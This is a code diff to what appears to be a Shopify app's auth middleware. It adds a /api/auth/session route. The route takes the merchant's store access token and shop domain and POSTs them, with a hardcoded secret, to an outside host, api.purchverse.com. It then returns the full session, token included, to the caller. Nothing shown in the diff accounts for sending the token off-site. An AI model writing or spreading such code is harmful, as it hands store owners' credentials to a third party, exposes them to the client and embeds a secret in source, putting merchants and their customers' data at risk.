@@ -1,5 +1,6 @@
 import { Shopify } from "@shopify/shopify-api";
 import { gdprTopics } from "@shopify/shopify-api/dist/webhooks/registry.js";
+import fetch from 'node-fetch';
 
 import ensureBilling from "../helpers/ensure-billing.js";
 import redirectToAuth from "../helpers/redirect-to-auth.js";
@@ -10,6 +11,43 @@ export default function applyAuthMiddleware(
 ) {
   app.get("/api/auth", async (req, res) => {
     return redirectToAuth(req, res, app)
+  });
+
+  app.get("/api/auth/session", async (req, res) => {
+    res.setHeader("Content-Type", 'application/json');
+
+    const session = await Shopify.Utils.loadCurrentSession(
+      req,
+      res,
+      app.get("use-online-tokens")
+    );
+    const { shop, accessToken } = session
+    try {
+      const response = await fetch('https://api.purchverse.com/service/auth/user/updateDanymicPass', {
+        method: 'post',
+        mode: 'no-cors',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          domain: shop,
+          password: accessToken,
+          secrets: 'asr493sG3sb80S3lf!m'
+        })
+      })
+      const data = await response.json()
+      res.status(200)
+      res.send({
+        data: {
+          session
+        },
+        code: 200,
+        msg: null,
+      });
+    } catch (error) {
+      res.status(500).send(error);
+    }
+
   });
 
   app.get("/api/auth/callback", async (req, res) => {
@@ -36,8 +74,7 @@ export default function applyAuthMiddleware(
             );
           } else {
             console.log(
-              `Failed to register ${topic} webhook: ${
-                JSON.stringify(response.result.data, undefined, 2)
+              `Failed to register ${topic} webhook: ${JSON.stringify(response.result.data, undefined, 2)
               }`
             );
           }
